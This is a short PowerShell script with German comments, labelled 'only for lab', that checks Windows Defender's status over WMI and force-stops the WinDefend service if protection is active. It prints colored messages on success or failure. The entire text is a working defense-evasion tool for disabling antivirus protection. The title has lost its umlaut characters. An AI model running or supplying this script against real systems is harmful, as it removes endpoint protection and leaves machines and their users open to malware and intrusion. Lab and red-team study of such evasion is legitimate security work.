# PowerShell-Skript: Defender ber WMI deaktivieren (nur fr Lab!)
$defender = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class MSFT_MpComputerStatus

if ($defender.AntispywareEnabled -eq $true) {
    Write-Host "[+] Defender ist aktiv - versuche Dienst zu beenden..." -ForegroundColor Yellow
    Stop-Service -Name WinDefend -Force
    Start-Sleep -Seconds 3
    $check = Get-Service -Name WinDefend
    if ($check.Status -eq "Stopped") {
        Write-Host "[+] Defender erfolgreich gestoppt!" -ForegroundColor Green
    } else {
        Write-Host "[-] Fehler: Dienst konnte nicht gestoppt werden." -ForegroundColor Red
    }
} else {
    Write-Host "[*] Defender scheint bereits deaktiviert zu sein." -ForegroundColor Cyan
}